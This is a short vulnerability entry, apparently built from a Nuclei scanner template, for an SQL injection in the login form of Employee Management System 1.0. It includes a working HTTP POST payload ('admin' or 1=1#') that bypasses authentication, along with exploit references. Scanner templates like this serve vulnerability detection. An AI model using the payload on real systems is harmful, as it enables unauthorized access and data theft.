# Nuclei Template: Employee Management System 1.0 - SQL Injection
**Template ID:** ems-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`ems-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Employee Management System 1.0 contains a SQL injection vulnerability via the username parameter.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
POST /process/aprocess.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

mailuid=admin' or 1=1#&pwd={{rand_base(5)}}&login-submit=Login
```

## References
- https://www.exploit-db.com/exploits/48882
- https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip
